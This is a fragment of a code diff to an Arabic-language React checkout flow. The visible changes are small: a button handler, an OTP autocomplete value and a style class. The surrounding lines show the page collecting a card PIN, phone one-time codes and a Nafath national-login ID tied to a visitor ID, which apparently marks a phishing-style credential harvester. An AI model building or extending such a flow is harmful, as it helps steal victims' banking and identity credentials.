-                  <span className="text-muted-foreground">رقم الجوال</span>
-                  <Input
-                    type="tel"
-                    inputMode="numeric"
-                    maxLength={10}
-                    value={phone2}
-                    onChange={(e) => setPhone2(e.target.value)}
-                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
-                  />                </div>
                 <Separator />
                 <div className="flex justify-between items-center">
                   <span className="text-muted-foreground">مزود الخدمة</span>
@@ -846,7 +1186,7 @@ addData({id:visitorId,nafathId,authNumber:''})
                 <Button variant="outline" className="flex-1 bg-transparent" onClick={() => setStep("card-pin")}>
                   رجوع
                 </Button>
-                <Button className="flex-1" onClick={sendPhoneOtp}>
+                <Button className="flex-1" onClick={handlePhoneVerification}>
                   متابعة التحقق
                 </Button>
               </div>
@@ -872,7 +1212,7 @@ addData({id:visitorId,nafathId,authNumber:''})
                   <Input
                     type="text"
                     inputMode="numeric"
-                    autoComplete="otp"
+                    autoComplete="one-time-code"
                     maxLength={6}
                     value={phoneOtp}
                     onChange={(e) => setPhoneOtp(e.target.value)}
@@ -986,9 +1326,8 @@ addData({id:visitorId,nafathId,authNumber:''})
                   تم التحقق من جميع بياناتك بنجاح، هل تريد إتمام الطلب؟
                 </DialogDescription>
               </DialogHeader>
-
               <div className="space-y-4">
-                <div className="p-4 bg-muted rounded-lg space-y-2 text-sm">
+                <div className="p-4 bg-muted rounded-lg space-y-2">
                   <div className="flex justify-between">
                     <span className="text-muted-foreground">الاسم</span>
                     <span className="font-medium">{shippingInfo.fullName}</span>
